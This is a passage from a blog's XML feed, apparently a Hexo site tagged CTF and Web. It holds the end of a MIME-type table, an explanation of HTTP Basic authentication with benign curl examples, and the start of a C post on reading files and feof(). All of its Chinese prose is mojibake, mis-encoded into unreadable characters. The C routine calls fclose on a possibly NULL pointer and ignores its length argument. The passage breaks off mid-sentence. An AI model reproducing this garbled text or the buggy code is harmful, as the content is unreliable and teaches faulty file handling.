style="text-align:left">application/vnd.ms-powerpoint</td></tr><tr><td style="text-align:left">.ppa</td><td style="text-align:left">application/vnd.ms-powerpoint</td><td style="text-align:left">.ppm</td><td style="text-align:left">application/x-ppm</td></tr><tr><td style="text-align:left">.pps</td><td style="text-align:left">application/vnd.ms-powerpoint</td><td style="text-align:left">.ppt</td><td style="text-align:left">application/vnd.ms-powerpoint</td></tr><tr><td style="text-align:left">.ppt</td><td style="text-align:left">application/x-ppt</td><td style="text-align:left">.pr</td><td style="text-align:left">application/x-pr</td></tr><tr><td style="text-align:left">.prf</td><td style="text-align:left">application/pics-rules</td><td style="text-align:left">.prn</td><td style="text-align:left">application/x-prn</td></tr><tr><td style="text-align:left">.prt</td><td style="text-align:left">application/x-prt</td><td style="text-align:left">.ps</td><td style="text-align:left">application/x-ps</td></tr><tr><td style="text-align:left">.ps</td><td style="text-align:left">application/postscript</td><td style="text-align:left">.ptn</td><td style="text-align:left">application/x-ptn</td></tr><tr><td style="text-align:left">.pwz</td><td style="text-align:left">application/vnd.ms-powerpoint</td><td style="text-align:left">.r3t</td><td style="text-align:left">text/vnd.rn-realtext3d</td></tr><tr><td style="text-align:left">.ra</td><td style="text-align:left">audio/vnd.rn-realaudio</td><td style="text-align:left">.ram</td><td style="text-align:left">audio/x-pn-realaudio</td></tr><tr><td style="text-align:left">.ras</td><td style="text-align:left">application/x-ras</td><td style="text-align:left">.rat</td><td style="text-align:left">application/rat-file</td></tr><tr><td style="text-align:left">.rdf</td><td style="text-align:left">text/xml</td><td style="text-align:left">.rec</td><td style="text-align:left">application/vnd.rn-recording</td></tr><tr><td style="text-align:left">.red</td><td style="text-align:left">application/x-red</td><td style="text-align:left">.rgb</td><td style="text-align:left">application/x-rgb</td></tr><tr><td style="text-align:left">.rjs</td><td style="text-align:left">application/vnd.rn-realsystem-rjs</td><td style="text-align:left">.rjt</td><td style="text-align:left">application/vnd.rn-realsystem-rjt</td></tr><tr><td style="text-align:left">.rlc</td><td style="text-align:left">application/x-rlc</td><td style="text-align:left">.rle</td><td style="text-align:left">application/x-rle</td></tr><tr><td style="text-align:left">.rm</td><td style="text-align:left">application/vnd.rn-realmedia</td><td style="text-align:left">.rmf</td><td style="text-align:left">application/vnd.adobe.rmf</td></tr><tr><td style="text-align:left">.rmi</td><td style="text-align:left">audio/mid</td><td style="text-align:left">.rmj</td><td style="text-align:left">application/vnd.rn-realsystem-rmj</td></tr><tr><td style="text-align:left">.rmm</td><td style="text-align:left">audio/x-pn-realaudio</td><td style="text-align:left">.rmp</td><td style="text-align:left">application/vnd.rn-rn_music_package</td></tr><tr><td style="text-align:left">.rms</td><td style="text-align:left">application/vnd.rn-realmedia-secure</td><td style="text-align:left">.rmvb</td><td style="text-align:left">application/vnd.rn-realmedia-vbr</td></tr><tr><td style="text-align:left">.rmx</td><td style="text-align:left">application/vnd.rn-realsystem-rmx</td><td style="text-align:left">.rnx</td><td style="text-align:left">application/vnd.rn-realplayer</td></tr><tr><td style="text-align:left">.rp</td><td style="text-align:left">image/vnd.rn-realpix</td><td style="text-align:left">.rpm</td><td style="text-align:left">audio/x-pn-realaudio-plugin</td></tr><tr><td style="text-align:left">.rsml</td><td style="text-align:left">application/vnd.rn-rsml</td><td style="text-align:left">.rt</td><td style="text-align:left">text/vnd.rn-realtext</td></tr><tr><td style="text-align:left">.rtf</td><td style="text-align:left">application/msword</td><td style="text-align:left">.rtf</td><td style="text-align:left">application/x-rtf</td></tr><tr><td style="text-align:left">.rv</td><td style="text-align:left">video/vnd.rn-realvideo</td><td style="text-align:left">.sam</td><td style="text-align:left">application/x-sam</td></tr><tr><td style="text-align:left">.sat</td><td style="text-align:left">application/x-sat</td><td style="text-align:left">.sdp</td><td style="text-align:left">application/sdp</td></tr><tr><td style="text-align:left">.sdw</td><td style="text-align:left">application/x-sdw</td><td style="text-align:left">.sit</td><td style="text-align:left">application/x-stuffit</td></tr><tr><td style="text-align:left">.slb</td><td style="text-align:left">application/x-slb</td><td style="text-align:left">.sld</td><td style="text-align:left">application/x-sld</td></tr><tr><td style="text-align:left">.slk</td><td style="text-align:left">drawing/x-slk</td><td style="text-align:left">.smi</td><td style="text-align:left">application/smil</td></tr><tr><td style="text-align:left">.smil</td><td style="text-align:left">application/smil</td><td style="text-align:left">.smk</td><td style="text-align:left">application/x-smk</td></tr><tr><td style="text-align:left">.snd</td><td style="text-align:left">audio/basic</td><td style="text-align:left">.sol</td><td style="text-align:left">text/plain</td></tr><tr><td style="text-align:left">.sor</td><td style="text-align:left">text/plain</td><td style="text-align:left">.spc</td><td style="text-align:left">application/x-pkcs7-certificates</td></tr><tr><td style="text-align:left">.spl</td><td style="text-align:left">application/futuresplash</td><td style="text-align:left">.spp</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.ssm</td><td style="text-align:left">application/streamingmedia</td><td style="text-align:left">.sst</td><td style="text-align:left">application/vnd.ms-pki.certstore</td></tr><tr><td style="text-align:left">.stl</td><td style="text-align:left">application/vnd.ms-pki.stl</td><td style="text-align:left">.stm</td><td style="text-align:left">text/html</td></tr><tr><td style="text-align:left">.sty</td><td style="text-align:left">application/x-sty</td><td style="text-align:left">.svg</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.swf</td><td style="text-align:left">application/x-shockwave-flash</td><td style="text-align:left">.tdf</td><td style="text-align:left">application/x-tdf</td></tr><tr><td style="text-align:left">.tg4</td><td style="text-align:left">application/x-tg4</td><td style="text-align:left">.tga</td><td style="text-align:left">application/x-tga</td></tr><tr><td style="text-align:left">.tif</td><td style="text-align:left">image/tiff</td><td style="text-align:left">.tif</td><td style="text-align:left">application/x-tif</td></tr><tr><td style="text-align:left">.tiff</td><td style="text-align:left">image/tiff</td><td style="text-align:left">.tld</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.top</td><td style="text-align:left">drawing/x-top</td><td style="text-align:left">.torrent</td><td style="text-align:left">application/x-bittorrent</td></tr><tr><td style="text-align:left">.tsd</td><td style="text-align:left">text/xml</td><td style="text-align:left">.txt</td><td style="text-align:left">text/plain</td></tr><tr><td style="text-align:left">.uin</td><td style="text-align:left">application/x-icq</td><td style="text-align:left">.uls</td><td style="text-align:left">text/iuls</td></tr><tr><td style="text-align:left">.vcf</td><td style="text-align:left">text/x-vcard</td><td style="text-align:left">.vda</td><td style="text-align:left">application/x-vda</td></tr><tr><td style="text-align:left">.vdx</td><td style="text-align:left">application/vnd.visio</td><td style="text-align:left">.vml</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.vpg</td><td style="text-align:left">application/x-vpeg005</td><td style="text-align:left">.vsd</td><td style="text-align:left">application/vnd.visio</td></tr><tr><td style="text-align:left">.vsd</td><td style="text-align:left">application/x-vsd</td><td style="text-align:left">.vss</td><td style="text-align:left">application/vnd.visio</td></tr><tr><td style="text-align:left">.vst</td><td style="text-align:left">application/vnd.visio</td><td style="text-align:left">.vst</td><td style="text-align:left">application/x-vst</td></tr><tr><td style="text-align:left">.vsw</td><td style="text-align:left">application/vnd.visio</td><td style="text-align:left">.vsx</td><td style="text-align:left">application/vnd.visio</td></tr><tr><td style="text-align:left">.vtx</td><td style="text-align:left">application/vnd.visio</td><td style="text-align:left">.vxml</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.wav</td><td style="text-align:left">audio/wav</td><td style="text-align:left">.wax</td><td style="text-align:left">audio/x-ms-wax</td></tr><tr><td style="text-align:left">.wb1</td><td style="text-align:left">application/x-wb1</td><td style="text-align:left">.wb2</td><td style="text-align:left">application/x-wb2</td></tr><tr><td style="text-align:left">.wb3</td><td style="text-align:left">application/x-wb3</td><td style="text-align:left">.wbmp</td><td style="text-align:left">image/vnd.wap.wbmp</td></tr><tr><td style="text-align:left">.wiz</td><td style="text-align:left">application/msword</td><td style="text-align:left">.wk3</td><td style="text-align:left">application/x-wk3</td></tr><tr><td style="text-align:left">.wk4</td><td style="text-align:left">application/x-wk4</td><td style="text-align:left">.wkq</td><td style="text-align:left">application/x-wkq</td></tr><tr><td style="text-align:left">.wks</td><td style="text-align:left">application/x-wks</td><td style="text-align:left">.wm</td><td style="text-align:left">video/x-ms-wm</td></tr><tr><td style="text-align:left">.wma</td><td style="text-align:left">audio/x-ms-wma</td><td style="text-align:left">.wmd</td><td style="text-align:left">application/x-ms-wmd</td></tr><tr><td style="text-align:left">.wmf</td><td style="text-align:left">application/x-wmf</td><td style="text-align:left">.wml</td><td style="text-align:left">text/vnd.wap.wml</td></tr><tr><td style="text-align:left">.wmv</td><td style="text-align:left">video/x-ms-wmv</td><td style="text-align:left">.wmx</td><td style="text-align:left">video/x-ms-wmx</td></tr><tr><td style="text-align:left">.wmz</td><td style="text-align:left">application/x-ms-wmz</td><td style="text-align:left">.wp6</td><td style="text-align:left">application/x-wp6</td></tr><tr><td style="text-align:left">.wpd</td><td style="text-align:left">application/x-wpd</td><td style="text-align:left">.wpg</td><td style="text-align:left">application/x-wpg</td></tr><tr><td style="text-align:left">.wpl</td><td style="text-align:left">application/vnd.ms-wpl</td><td style="text-align:left">.wq1</td><td style="text-align:left">application/x-wq1</td></tr><tr><td style="text-align:left">.wr1</td><td style="text-align:left">application/x-wr1</td><td style="text-align:left">.wri</td><td style="text-align:left">application/x-wri</td></tr><tr><td style="text-align:left">.wrk</td><td style="text-align:left">application/x-wrk</td><td style="text-align:left">.ws</td><td style="text-align:left">application/x-ws</td></tr><tr><td style="text-align:left">.ws2</td><td style="text-align:left">application/x-ws</td><td style="text-align:left">.wsc</td><td style="text-align:left">text/scriptlet</td></tr><tr><td style="text-align:left">.wsdl</td><td style="text-align:left">text/xml</td><td style="text-align:left">.wvx</td><td style="text-align:left">video/x-ms-wvx</td></tr><tr><td style="text-align:left">.xdp</td><td style="text-align:left">application/vnd.adobe.xdp</td><td style="text-align:left">.xdr</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.xfd</td><td style="text-align:left">application/vnd.adobe.xfd</td><td style="text-align:left">.xfdf</td><td style="text-align:left">application/vnd.adobe.xfdf</td></tr><tr><td style="text-align:left">.xhtml</td><td style="text-align:left">text/html</td><td style="text-align:left">.xls</td><td style="text-align:left">application/vnd.ms-excel</td></tr><tr><td style="text-align:left">.xls</td><td style="text-align:left">application/x-xls</td><td style="text-align:left">.xlw</td><td style="text-align:left">application/x-xlw</td></tr><tr><td style="text-align:left">.xml</td><td style="text-align:left">text/xml</td><td style="text-align:left">.xpl</td><td style="text-align:left">audio/scpls</td></tr><tr><td style="text-align:left">.xq</td><td style="text-align:left">text/xml</td><td style="text-align:left">.xql</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.xquery</td><td style="text-align:left">text/xml</td><td style="text-align:left">.xsd</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.xsl</td><td style="text-align:left">text/xml</td><td style="text-align:left">.xslt</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.xwd</td><td style="text-align:left">application/x-xwd</td><td style="text-align:left">.x_b</td><td style="text-align:left">application/x-x_b</td></tr><tr><td style="text-align:left">.sis</td><td style="text-align:left">application/vnd.symbian.install</td><td style="text-align:left">.sisx</td><td style="text-align:left">application/vnd.symbian.install</td></tr><tr><td style="text-align:left">.x_t</td><td style="text-align:left">application/x-x_t</td><td style="text-align:left">.ipa</td><td style="text-align:left">application/vnd.iphone</td></tr><tr><td style="text-align:left">.apk</td><td style="text-align:left">application/vnd.android.package-archive</td><td style="text-align:left">.xap</td><td style="text-align:left">application/x-silverlight-app</td></tr></tbody></table></div><h2 id="7ã€HTTP-åŸºæœ¬è®¤è¯"><a href="#7ã€HTTP-åŸºæœ¬è®¤è¯" class="headerlink" title="7ã€HTTP åŸºæœ¬è®¤è¯"></a>7ã€HTTP åŸºæœ¬è®¤è¯</h2><p>åœ¨HTTPä¸­ï¼ŒåŸºæœ¬è®¤è¯ï¼ˆè‹±è¯­ï¼šBasic access authenticationï¼‰æ˜¯å…è®¸httpç”¨æˆ·ä»£ç†ï¼ˆå¦‚ï¼šç½‘é¡µæµè§ˆå™¨ï¼‰åœ¨è¯·æ±‚æ—¶ï¼Œæä¾›ç”¨æˆ·å’Œå¯†ç çš„ä¸€ç§æ–¹å¼ã€‚è¯¦æƒ…è¯·æŸ¥çœ‹ï¼š<a href="https://zh.wikipedia.org/wiki/HTTPåŸºæœ¬è®¤è¯">https://zh.wikipedia.org/wiki/HTTPåŸºæœ¬è®¤è¯</a> ã€‚</p><p>è¿™ä¸€ä¸ªå…¸å‹çš„ HTTP å®¢æˆ·ç«¯å’Œ HTTP æœåŠ¡å™¨çš„å¯¹è¯ï¼ŒæœåŠ¡å™¨å®‰è£åœ¨åŒä¸€å°è®¡ç®—æœºä¸Šï¼ˆlocalhostï¼‰ã€‚åŒ…å«ä»¥ä¸‹æ­¥éª¤ï¼š</p><blockquote><ol><li>å®¢æˆ·ç«¯è¯·æ±‚ä¸€ä¸ªéœ€è¦èº«ä»½è®¤è¯çš„é¡µé¢ï¼Œä½†æ˜¯æ²¡æœ‰æä¾›ç”¨æˆ·åå’Œå¯†ç ã€‚è¿™é€šå¸¸æ˜¯ç”¨æˆ·åœ¨åœ°å€æ è¾“å…¥ä¸€ä¸ª URL ï¼Œ æˆ–æ˜¯æ‰“å¼€äº†ä¸€ä¸ªæŒ‡å‘è¯¥é¡µé¢çš„é“¾æ¥ã€‚</li><li>æœåŠ¡ç«¯å“åº”ä¸€ä¸ª 401 åº”ç­”ç ï¼Œå¹¶æä¾›ä¸€ä¸ªè®¤è¯åŸŸï¼ˆ è‹±è¯­ï¼šAccess Authenticationï¼‰ï¼Œå¤´éƒ¨å­—æ®µä¸ºï¼š<code>WWW-Authenticate</code> ï¼Œè¯¥å­—æ®µä¸ºè¦æ±‚å®¢æˆ·ç«¯æä¾›é€‚é…çš„èµ„æºã€‚<code>WWW-Authenticateï¼šBasic realm = &quot;Secure Area&quot;</code> è¯¥ä¾‹å­ï¼Œ<code>Basic</code> ä¸ºéªŒè¯çš„æ¨¡å¼ï¼Œ<code>realm = &quot;Secure Area&quot;</code> ä¸ºä¿æŠ¤åŸŸï¼Œç”¨äºä¸å…¶ä»–è¯·æ±‚ URI ä½œåŒºåˆ«ã€‚</li><li>æ¥åˆ°åº”ç­”åï¼Œå®¢æˆ·ç«¯æ˜¾ç¤ºè¯¥è®¤è¯åŸŸç»™ç”¨æˆ·å¹¶æç¤ºè¾“å…¥ç”¨æˆ·åå’Œå¯†ç ã€‚æ­¤æ—¶ç”¨æˆ·å¯ä»¥é€‰ç¡®å®šæˆ–å–æ¶ˆã€‚</li><li>ç”¨æˆ·è¾“å…¥äº†ç”¨æˆ·åå’Œå¯†ç åï¼Œå®¢æˆ·ç«¯è½¯ä»¶å°†å¯¹å…¶è¿›è¡Œå¤„ç†ï¼Œå¹¶åœ¨åŸå…ˆçš„è¯·æ±‚ä¸Šå¢åŠ è®¤è¯æ¶ˆæ¯å¤´ï¼ˆ è‹±è¯­ï¼š Authorization ï¼‰ç„¶åé‡æ–°å‘é€å†æ¬¡å°è¯•ã€‚è¿‡ç¨‹å¦‚ä¸‹ï¼š<ol><li>å°†ç”¨æˆ·åå’Œå¯†ç æ‹¼æ¥ä¸º <code>ç”¨æˆ·:å¯†ç </code> å½¢å¼çš„å­—ç¬¦ä¸²ã€‚</li><li>å¦‚æœæœåŠ¡å™¨ <code>WWW-Authenticate</code> å­—æ®µæœ‰æŒ‡å®šç¼–ç ï¼Œåˆ™å°†å­—ç¬¦ä¸²ç¼–è¯‘æˆå¯¹åº”çš„ç¼–ç ï¼ˆ å¦‚ï¼šUTF-8ï¼‰ã€‚</li><li>å°†å­—ç¬¦ä¸²ç¼–ç ä¸º base64 ã€‚</li><li>æ‹¼æ¥ <code>Basic</code> ï¼Œæ”¾å…¥ <code>Authorization</code> å¤´å­—æ®µï¼Œå°±åƒè¿™æ ·ï¼š<code>Authorization Basic å­—ç¬¦ä¸²</code> ã€‚ç¤ºä¾‹ï¼šç”¨æˆ·åï¼š<code>Aladdin</code> ï¼Œå¯†ç ï¼š<code>OpenSesame</code> ï¼Œ æ‹¼æ¥åä¸º <code>Aladdin:OpenSesame</code> ï¼Œç¼–ç å <code>QWxhZGRpbjpPcGVuU2VzYW1l</code> ã€‚åœ¨ HTTP å¤´éƒ¨é‡Œä¼šæ˜¯è¿™æ ·ï¼š<code>Authorizationï¼šBasic QWxhZGRpbjpPcGVuU2VzYW1l</code> ã€‚Base64 ç¼–ç å¹¶éåŠ å¯†ç®—æ³•ï¼Œå…¶æ— æ³•ä¿è¯å®‰å…¨ä¸éšç§ï¼Œä»…ç”¨äºå°†ç”¨æˆ·åå’Œå¯†ç ä¸­çš„ä¸å…¼å®¹çš„å­—ç¬¦è½¬åŒ–ä¸ºå‡ä¸ HTTP åè®®å…¼å®¹çš„å­—ç¬¦é›† ã€‚</li></ol></li><li>åœ¨æœ¬ä¾‹ä¸­ï¼ŒæœåŠ¡å™¨æ¥å—äº†è¯¥è®¤è¯å±å¹•å¹¶è¿”å›äº†é¡µé¢ã€‚å¦‚æœç”¨æˆ·å‡­æ®éæ³•æˆ–æ— æ•ˆï¼ŒæœåŠ¡å™¨å¯èƒ½å†æ¬¡è¿”å› 401 åº”ç­”ç ï¼Œå®¢æˆ·ç«¯å¯ä»¥å†æ¬¡æç¤ºç”¨æˆ·è¾“å…¥å¯†ç  ã€‚</li></ol></blockquote><p>æ³¨æ„ï¼šå®¢æˆ·ç«¯æœ‰å¯èƒ½ä¸éœ€è¦ç”¨æˆ·äº¤äº’ï¼Œåœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚ä¸­å°±å‘é€è®¤è¯æ¶ˆæ¯å¤´ ã€‚</p><h1 id="0x02-Curl-ç”¨æ³•"><a href="#0x02-Curl-ç”¨æ³•" class="headerlink" title="0x02 Curl ç”¨æ³•"></a>0x02 Curl ç”¨æ³•</h1><p><strong>curl æ˜¯ä¸€ä¸ªå’ŒæœåŠ¡å™¨äº¤äº’ä¿¡æ¯ï¼ˆå‘é€å’Œè·å–ä¿¡æ¯ï¼‰çš„å‘½ä»¤è¡Œå·¥å…·ã€‚</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -i http://www.xxx.com  <span class="hljs-comment">#æŸ¥çœ‹HTTPå“åº”å¤´</span><br>curl -v http://www.xxx.com  <span class="hljs-comment">#æŸ¥çœ‹äº¤äº’è¿‡ç¨‹;-vå‚æ•°è¾“å‡ºé€šä¿¡çš„æ•´ä¸ªè¿‡ç¨‹ï¼Œç”¨äºè°ƒè¯•ã€‚</span><br><span class="hljs-comment">#å½“å‘èµ·httpè¯·æ±‚æ—¶ï¼Œcurlä¼šé»˜è®¤å‘èµ·GETè¯·æ±‚ï¼Œä¹Ÿå¯ä»¥&quot;-X GET&quot;æ–¹å¼æŒ‡å®šã€‚</span><br>curl -X GET http://www.xxx.com  <span class="hljs-comment">#GETè¯·æ±‚</span><br><span class="hljs-comment">#å½“ä½¿ç”¨POSTè¯·æ±‚æ–¹å¼ï¼Œéœ€è¦é€šè¿‡æŒ‡å®šâ€œ-dâ€ï¼Œå‘æœåŠ¡å™¨ä¼ é€’æ•°æ®ã€‚</span><br>curl -X POST http://www.xxx.com -d â€œå‚æ•°â€  <span class="hljs-comment">#POSTè¯·æ±‚</span><br></code></pre></td></tr></table></figure><h1 id="0x03-å‚è€ƒ"><a href="#0x03-å‚è€ƒ" class="headerlink" title="0x03 å‚è€ƒ"></a>0x03 å‚è€ƒ</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.runoob.com/http/http-tutorial.html">HTTP æ•™ç¨‹ | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> â†©</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
      <tag>HTTP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cè¯­è¨€æ–‡ä»¶æ“ä½œ</title>
    <link href="/2021/07/27/Code/C/C%E8%AF%AD%E8%A8%80%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
    <url>/2021/07/27/Code/C/C%E8%AF%AD%E8%A8%80%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="Cè¯­è¨€æ–‡ä»¶æ“ä½œ"><a href="#Cè¯­è¨€æ–‡ä»¶æ“ä½œ" class="headerlink" title="Cè¯­è¨€æ–‡ä»¶æ“ä½œ"></a>Cè¯­è¨€æ–‡ä»¶æ“ä½œ</h1><h2 id="ä¸€æ¬¡æ€§è¯»å–æ–‡ä»¶å…¨éƒ¨å†…å®¹"><a href="#ä¸€æ¬¡æ€§è¯»å–æ–‡ä»¶å…¨éƒ¨å†…å®¹" class="headerlink" title="ä¸€æ¬¡æ€§è¯»å–æ–‡ä»¶å…¨éƒ¨å†…å®¹"></a>ä¸€æ¬¡æ€§è¯»å–æ–‡ä»¶å…¨éƒ¨å†…å®¹</h2><p>å…³é”®æ˜¯è·å–æ–‡ä»¶çš„å¤§å°ï¼ŒçŸ¥é“æ–‡ä»¶å¤§å°å°±å¯ä»¥ç”¨<code>fread</code>ä¸€æ¬¡è¯»å…¥å†…å­˜ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">Read</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *path,<span class="hljs-keyword">int</span> length)</span>   <span class="hljs-comment">//æ–‡ä»¶åç§°ï¼ˆæ–‡ä»¶è·¯å¾„ï¼‰pathã€æ–‡ä»¶å¤§å°length</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE *fp=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">char</span> *data=<span class="hljs-literal">NULL</span>;<br>    fp = fopen(path,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!fp)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;file open error !&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>        length = ftell(fp);<br>        rewind(fp);<br>        data = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>((length+<span class="hljs-number">1</span>)*<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>));<br>        fread(data,<span class="hljs-number">1</span>,length,fp);<br>        data[length] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    &#125;<br>    fclose(fp);<br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨<code>fseek()</code>å®šä½åˆ°æ–‡ä»¶æœ«å°¾ï¼Œ<code>ftell()</code>è®¡ç®—å½“å‰æ–‡ä»¶æŒ‡é’ˆä½ç½®ç›¸å¯¹äºæ–‡ä»¶é¦–çš„åç§»å­—èŠ‚æ•°ï¼Œä¹Ÿå°±æ˜¯æ–‡ä»¶çš„å¤§å°ï¼Œæœ€åç”¨<code>rewind()</code>é‡æ–°å®šä½åˆ°æ–‡ä»¶å¼€å¤´ä½ç½®ï¼Œæœ€å<code>fread()</code>è¯»å…¥ã€‚</p><h2 id="feof-åŸç†å’Œç”¨æ³•"><a href="#feof-åŸç†å’Œç”¨æ³•" class="headerlink" title="feof()åŸç†å’Œç”¨æ³•"></a>feof()åŸç†å’Œç”¨æ³•</h2><h3 id="ä¸€ã€feof-æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#ä¸€ã€feof-æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ä¸€ã€feof()æ˜¯ä»€ä¹ˆï¼Ÿ"></a>ä¸€ã€feof()æ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>feof()æ˜¯æ£€æµ‹æµä¸Šçš„æ–‡ä»¶ç»“æŸç¬¦çš„å‡½æ•°ï¼Œå¦‚æœæ–‡ä»¶ç»“æŸï¼Œåˆ™è¿”å›é0å€¼ï¼Œå¦åˆ™è¿”å›0ã€‚ä¸€èˆ¬åœ¨æ–‡ä»¶æ“ä½œä¸­ç»å¸¸ä½¿ç”¨feof()åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ç»“æŸã€‚</p><p>åœ¨Cè¯­è¨€ä¸­ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨ä¸æ–‡ä»¶é“¾æ¥çš„æµæ—¶ï¼Œé‚£ä¹ˆå¦‚ä½•ç¡®å®šåˆ°æ–‡ä»¶æœ«å°¾ã€‚ ä¸ºäº†è§£å†³è¯¥é—®é¢˜ï¼Œæˆ‘ä»¬å¿…é¡»å°†æ•´æ•°å€¼ä¸EOFå€¼è¿›è¡Œæ¯”è¾ƒã€‚ é€šè¿‡feof()å‡½æ•°ï¼Œæˆ‘ä»¬ç¡®å®šæ–‡ä»¶çš„EOFæ˜¯å¦å‘ç”Ÿã€‚ æœªå‡ºç°æ–‡ä»¶ç»“å°¾æ—¶ï¼Œå®ƒè¿”å›é›¶å€¼ï¼›å¦åˆ™è¿”å›1ã€‚</p><h3 id="äºŒã€feof-çš„åŸç†"><a href="#äºŒã€feof-çš„åŸç†" class="headerlink" title="äºŒã€feof()çš„åŸç†"></a>äºŒã€feof()çš„åŸç†</h3><h4 id="1ã€EOF"><a href="#1ã€EOF" class="headerlink" title="1ã€EOF"></a>1ã€EOF</h4><p>EOFæ˜¯ä¸€ä¸ªè®¡ç®—æœºæœ¯è¯­ï¼Œä¸ºEnd Of Fileçš„ç¼©å†™ï¼Œåœ¨æ“ä½œç³»ç»Ÿä¸­è¡¨ç¤ºèµ„æ–™æºæ— æ›´å¤šçš„èµ„æ–™å¯è¯»å–ã€‚èµ„æ–™æºé€šå¸¸ç§°ä¸ºæ¡£æ¡ˆæˆ–ä¸²æµã€‚é€šå¸¸åœ¨æ–‡æœ¬çš„æœ€åå­˜åœ¨æ­¤å­—ç¬¦è¡¨ç¤ºèµ„æ–™ç»“æŸã€‚</p><p>è¿™ä¸ªå®šä¹‰çš„æ„æ€æ˜¯ï¼Œæ–‡æ¡£çš„ç»“å°¾éƒ½æœ‰ä¸€ä¸ªéšè—å­—ç¬¦â€EOFâ€ï¼Œå½“ç¨‹åºè¯»å–å®ƒçš„æ—¶å€™ï¼Œå°±ä¼šçŸ¥é“æ–‡ä»¶å·²ç»åˆ°è¾¾ç»“å°¾ã€‚é€šå¸¸ä½¿ç”¨whileå¾ªç¯åŠ EOFåˆ¤æ–­ä½œä¸ºè¯»å–ç»“æŸçš„æ ‡å¿—ã€‚</p><p>EOF çš„å€¼é€šå¸¸ä¸º -1ï¼Œä½†å®ƒä¾ç³»ç»Ÿæœ‰æ‰€ä¸åŒã€‚</p><h4 id="2ã€feof"><a href="#2ã€feof" class="headerlink" title="2ã€feof()"></a>2ã€feof()</h4><p><strong>åŸå‹ï¼š</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">feof</span>(<span class="hljs-params">FILE* filename</span>)</span>;<br></code></pre></td></tr></table></figure><p>feof()çš„åŸç†ï¼š<br>feof()å‡½æ•°ï¼Œå¹¶ä¸æ˜¯é€šè¿‡è¯»å–åˆ°æ–‡ä»¶çš„EOFæ¥è¯„åˆ¤ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯å¦ä¸ºç©ºã€‚<br>å¯¹feof()æ¥è¯´,å®ƒçš„å·¥ä½œåŸç†æ˜¯ï¼Œç«™åœ¨å…‰æ ‡æ‰€åœ¨ä½ç½®ï¼Œå‘åçœ‹çœ‹è¿˜æœ‰æ²¡æœ‰å­—ç¬¦ã€‚å¦‚æœæœ‰ï¼Œè¿”å›0ï¼›å¦‚æœæ²¡æœ‰ï¼Œè¿”å›é0ã€‚å®ƒå¹¶ä¸ä¼šè¯»å–ç›¸å…³ä¿¡æ¯ï¼Œåªæ˜¯æŸ¥çœ‹å…‰æ ‡åæ˜¯å¦è¿˜æœ‰å†…å®¹ã€‚</p><h3 id="ä¸‰ã€feof-çš„ç»å…¸é”™è¯¯"><a href="#ä¸‰ã€feof-çš„ç»å…¸é”™è¯¯" class="headerlink" title="ä¸‰ã€feof()çš„ç»å…¸é”™è¯¯"></a>ä¸‰ã€feof()çš„ç»å…¸é”™è¯¯</h3><p>æ ¹æ®è¿™ä¸ªå‡½æ•°çš„å®šä¹‰ï¼Œä¸€èˆ¬å¤§å®¶éƒ½æ˜¯è¿™æ ·ä½¿ç”¨çš„ï¼Œä½†æ˜¯è¿™æ ·ä½¿ç”¨ï¼Œæ–‡ä»¶ä¸­æ— 